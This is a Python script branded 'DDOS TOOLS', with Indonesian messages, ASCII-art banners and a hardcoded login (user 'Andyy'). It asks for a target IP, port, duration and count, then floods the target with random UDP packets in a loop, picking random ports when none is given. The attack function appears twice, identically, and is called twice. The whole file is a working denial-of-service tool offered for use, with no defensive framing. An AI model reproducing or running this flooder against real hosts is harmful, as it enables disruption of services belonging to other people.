import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m
""")

username = str(input("\033[94m[DDOS TOOLS] \033[93mUsername:"))
password = str(input("\033[94m[DDOS TOOLS] \033[93mPassword:"))
if password == "imAndyy_" and username == "Andyy":
    print ("Telah Masuk Sebagai Andyy")
    time.sleep(2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999)

os.system("clear")
print("""\033[92m
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█ """)
time.sleep(5)


nicknm = "Andyy"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░▄███████▄░░░░░░░░░░
░░░░░░░░░▐██▀░░░▀██▌░░░░░░░░░
░░░░░░░░░▐██░░░░░██▌░░░░░░░░░
░░░░░░░░░▐██▄░░░▄██▌░░░░░░░░░
░░░░░░░░░░▀███████▀░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░░░░░░░░░▐███▄███▌░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░░░░░░░░░░░▐█▄█▌░░░░░░░░░░░░
░░▄█▄░░░░░░░▐█▄█▌░░░░░░░▄█▄░░
▄█████▄░░░░░▐█▄█▌░░░░░▄█████▄
░░███░░░░░░░▐█▄█▌░░░░░░░███░░
░░███▄░░░░░▄██▄██▄░░░░░▄███░░
░░▀████▄▄▄████▄████▄▄▄████▀░░
░░░░▀█████████▄█████████▀░░░░
░░░░░░▀███████▄███████▀░░░░░░
░░░░░░░░░▀████▄████▀░░░░░░░░░
░░░░░░░░░░░░▀█▄█▀░░░░░░░░░░░░
░░░░░░░░░░░░░░▀░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
""")


ip = str(input("\033[91m====> ★ IP   : "))
port = int(input("====> $ PORT   : "))
time = int(input("====> $ PACKET   : "))
threads = int(input("====> $ THREADS   : "))

os.system("clear")

brand = """\033[91m
────────────────────────────────────────
─────────────▄▄██████████▄▄─────────────
─────────────▀▀▀───██───▀▀▀─────────────
─────▄██▄───▄▄████████████▄▄───▄██▄─────
───▄███▀──▄████▀▀▀────▀▀▀████▄──▀███▄───
──████▄─▄███▀──────────────▀███▄─▄████──
─███▀█████▀▄████▄──────▄████▄▀█████▀███─
─██▀──███▀─██████──────██████─▀███──▀██─
──▀──▄██▀──▀████▀──▄▄──▀████▀──▀██▄──▀──
─────███───────────▀▀───────────███─────
─────██████████████████████████████─────
─▄█──▀██──███───██────██───███──██▀──█▄─
─███──███─███───██────██───███▄███──███─
─▀██▄████████───██────██───████████▄██▀─
──▀███▀─▀████───██────██───████▀─▀███▀──
───▀███▄──▀███████────███████▀──▄███▀───
─────▀███────▀▀██████████▀▀▀───███▀─────
───────▀─────▄▄▄───██───▄▄▄──────▀──────
──────────── ▀▀███████████▀▀ ────────────
────────────────────────────────────────


\033[95m
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m - DARI NEPHII TCUYY")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(666, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m - DARI NEPHII TCUYY")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(666, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    

if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')